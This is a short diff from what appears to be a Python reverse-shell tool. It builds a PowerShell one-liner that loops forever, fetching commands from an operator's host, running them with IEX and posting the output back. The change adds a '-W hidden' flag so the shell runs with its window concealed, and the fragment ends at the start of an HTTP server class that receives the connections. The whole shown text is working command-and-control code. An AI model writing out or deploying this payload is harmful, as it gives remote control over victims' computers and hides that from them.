@@ -8,7 +8,7 @@ GREEN = '\033[38;5;47m'; END = '\033[0m'
 payload = f"& {{while ($true){{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body $c}}}}"
 print(f"{GREEN}Test{END} payload_powershell:")
 print("")
-print(payload)
+print("powershell -W hidden {" +payload+"}")
 print("")
 
 class Http_Shell(http.server.BaseHTTPRequestHandler):
